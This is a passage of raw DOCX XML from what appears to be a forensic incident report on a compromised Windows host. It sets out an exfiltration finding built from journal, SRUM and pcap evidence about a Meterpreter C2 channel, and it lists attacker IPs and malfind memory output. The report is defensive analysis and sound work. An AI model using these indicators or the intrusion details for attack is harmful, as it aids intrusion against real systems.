      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_psxview</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "Name": "spoolsv.exe", "Offset(Virtual)": "209519070331392", "PID": "2188", "csrss": "true", "pslist": "true", "psscan": "true", "thrdscan": "true"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.psxview.PsXView.jsonl#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_malfind</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "CommitCharge": "256", "Disasm": "\"\n0x25453170000:\tor\tecx, dword ptr [rcx - 0x50f7d6f4]\n0x25453170006:\tadd\tdword ptr [rdi + riz*2], edx\n0x25453170009:\tadd\tedi, edi\n0x2545317000b:\tin\tal, dx\n0x2545317000d:\tcmp\tcl, byte ptr [rax]\"", "End VPN": "2561195573247", "File output": "Disabled", "Hexdump": "0b 89 0c 29 08 af</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.malfind.Malfind.jsonl#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.12 Collection, exfiltration and communications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Collection and exfiltration review:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Confirmed staging: Explorer zip "My Social Security Number.zip" was created at 03:46:15, renamed loot.zip at 03:46:18, opened (ObjectId change + loot.lnk) and deleted at 03:47:09. The source files are tiny (22, 141 and 7 bytes), so the archive was at most a few hundred bytes.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No archiver or transfer tools ran (Prefetch) and no other archives were created.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- BITS was used only by OneDrive. OneDrive was never signed in (ODL).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No HTTP uploads to attacker or non-Microsoft hosts, no DNS tunnelling, no SMB writes, no attacker firewall rules (only 2004/2006 AppX rules) and no removable media.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Network volumes (SRUM + pcap):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - coreupdater.exe sent 222 KB + 27 KB.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Meterpreter C2 flow 50875 sent 280 KB up; flow 50972 sent 39 KB.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - The RDP stream sent 6.7 MB from the workstation to the DC, matching SRUM TermService at 7.1 MB.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- F-031 (high/probable): exfiltration of the small archive most likely went over the encrypted Meterpreter C2. The RDP clipboard is an alternative. Neither can be proven at content level.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Timeline T-025 and a note were recorded. No new network IOCs beyond the existing 194.61.24.102 and 203.78.103.109.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-031: Exfiltration assessment: tiny staged archive (loot.zip from 22-byte SSN file) and only plausible channel is the encrypted Meterpreter C2 or the RDP session; no cloud, BITS, SMB, HTTP-upload or DNS exfil</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C00000"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Confidence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>probable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Independent sources</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>artifact:$mft</w:t>
              <w:br/>
              <w:t>artifact:$usnjrnl:$j</w:t>
              <w:br/>
              <w:t>artifact:onedrive (odl logs)</w:t>
              <w:br/>
              <w:t>artifact:srum (network usage per application)</w:t>
              <w:br/>
              <w:t>network</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>exfiltration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1560.001, T1041, T1005, T1074.001, T1021.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 22:50:19.426026 → 2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>FACTS (all UTC host time; pcap timestamps are +0200 and ~1 h behind host clock, see F-011):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1) Staging: $UsnJrnl shows "My Social Security Number.zip" created by Explorer in C:\Users\mortysmith\Documents at 03:46:15.27 (MFT 87445 then 87470 after the ~RF822ef7.TMP swap, usnjrnl.csv#36753/#36766), renamed loot.zip at 03:46:18.069 (#36776), ObjectIdChange at 03:46:18.129 (#36778, link tracking = the file was opened) with Recent\loot.lnk created at the same instant (#36780), then FileDelete at 03:47:09.917 (#36805). There are no other user-space file operations between 03:46:18 and 03:47:12, so no copy to another folder, share, \\tsclient or removable media. The source document C:\Users\mortysmith\Documents\My Social Security Number.txt is 22 bytes (mft.csv#117827), Plans.txt is 141 bytes (#117934) and Desktop\Thoughts.txt is 7 bytes (#117887). The archive was therefore at most a few hundred bytes.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2) Compression/transfer tools: Prefetch has no 7z, rar, zip, tar, rclone, curl, bitsadmin, ftp, scp, robocopy, xcopy or makecab. The archive was made with the native Explorer "Send to &gt; Compressed folder" function. $UsnJrnl shows no other .zip/.7z/.rar/.tar/.cab outside WindowsApps/WinSxS/APPX temp files.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3) Cloud/BITS: Bits-Client 3/59/60 jobs are only OneDrive UpdateBinary (https://oneclient.sfx.ms/.../OneDriveSetup.exe) and PreSignInSettingsConfigJSON (https://g.live.com/odclientsettings/Prod). That includes the C137\Administrator job at 03:37:00 (evtx #12391/#12393/#12394), created automatically at profile creation. OneDrive ODL for Administrator shows UX.RequiredSignIn / IsSigninNeeded at 03:37:35 (odl_Administrator_Personal.csv#1398, #1402), so the client was never signed in. SRUM OneDrive.exe traffic is ≤23 KB sent per slot (NetworkUsages #161/#182/#207).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4) SRUM network usage (NetworkUsages_Output.csv): coreupdater.exe (Administrator) sent 222,046 B / received 333,817 B in the 04:14 slot (#190) and 26,570 / 170,146 B in the 05:14 slot (#193). powershell.exe (ricksanchez) sent 15,721 / received 178,042 B in the 05:14 slot (#206). TermService sent 7,120,599 B / received 1,158,782 B in the 04:14 slot (#170). rdpclip.exe (Administrator) ran in the 04:14 slot (AppResourceUseInfo #667).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>5) Capture: the Meterpreter C2 flows from 10.42.85.115 to 203.78.103.109:443 sent 280,374 B up / 1,764,209 B down (src port 50875, 03:40:49 host → end of capture, eve_flow.jsonl#29788) and 39,409 B up / 488,552 B down (port 50972, 05:08:45 host, #16628). RDP flow DC 10.42.85.10:63121 → 10.42.85.115:3389 (03:36:23–03:52:14 host) carried 6,695,207 B from the workstation to the DC (#31238), which matches SRUM TermService. No other outbound flow to a non-Microsoft public IP has a significant upload: the top uploads are bing.com, displaycatalog, oneclient.sfx.ms and v10.events.data.microsoft.com (telemetry, 01:44 host, before the intrusion). There are no HTTP POST/PUT to non-Microsoft or non-PKI hosts (the only POSTs are o.ss2.us OCSP to the 10.90.90.90 sinkhole, go.microsoft.com and dmd.metaservices). No SMB WRITE from the workstation: only SYSVOL GPO reads and desktop.ini/AutoRun.inf on the Z: share. No long or high-entropy DNS queries: the longest are AD SRV records and footprintdns/conviva telemetry.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6) Firewall: all Firewall 2004/2006 events after 03:30 are per-user AppX/Cortana/Skype rules created at the profile loads of 03:36 and 05:08. There are no 5156/Sysmon 3/22 network events.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Collection is confirmed (F-013/F-026). Exfiltration is likely but cannot be proven at content level. The staged archive is tiny (a few hundred bytes), so it fits easily in the 280 KB the Meterpreter session (coreupdater.exe, later migrated into spoolsv.exe) sent upstream. The loot.lnk/ObjectId change at 03:46:18 shows the zip was opened or accessed right after the rename. Meterpreter "download" reads a file without leaving a disk copy, which would match the absence of any copy in $J before the deletion 51 s later. An alternative channel is the RDP session itself: clipboard via rdpclip.exe, which is active, or display. The 6.7 MB workstation→DC RDP stream is consistent with 16 minutes of graphical session but is TLS-encrypted, so a small clipboard transfer cannot be excluded or confirmed. Since the attacker had reached the DC and the share, they could also simply have re-read the files later. I found no evidence of cloud sync (OneDrive not signed in), BITS upload, HTTP upload, DNS tunnelling, SMB push or removable media exfiltration. The confidence is 'probable' because the C2 payload is encrypted and no content-level artifact (Meterpreter command history, decrypted stream) is available.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (12)</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03:46:15.269625</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\My Social Security Number.zip</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=87445-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36753</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.069334</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=87470-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36776</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.129513</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>ObjectIdChange [Archive] entry=87470-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36778</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.129513</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\loot.lnk</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=87445-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36780</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:09.917465</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>FileDelete|Close [Archive] entry=87470-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36805</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:50:19.426026</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\My Social Security Number.txt</w:t>
              <w:br/>
              <w:t>size=22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#117827</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume3\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>received=333817 sent=222046 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#190</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
